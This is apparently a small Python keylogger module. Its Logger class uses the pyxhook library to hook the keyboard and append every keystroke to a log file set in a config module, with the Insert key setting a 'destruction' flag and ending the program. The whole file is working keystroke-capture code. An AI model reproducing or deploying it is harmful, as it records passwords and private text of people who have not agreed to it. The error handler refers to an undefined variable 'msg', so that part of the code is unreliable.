import os
import pyxhook
import sys
import config as con

class Logger:
	
	def OnKeyPress(self, event):
	    with open(con.file['log_file'], 'a+') as f:
	    	if event.Key == "Insert":
	    		con.destruction = True
	    		sys.exit()
	    	f.write('{}'.format(event.Key))
	
	def start_logging(self):		
		# create a hook manager object
		new_hook = pyxhook.HookManager()
		new_hook.KeyDown = self.OnKeyPress

		# set the hook
		new_hook.HookKeyboard()
		
		try:
		    new_hook.start()         # start the hook

		except Exception as ex:
		    with open(con.file['error_file'], 'a') as f:
		        f.write('\n{}'.format(msg))
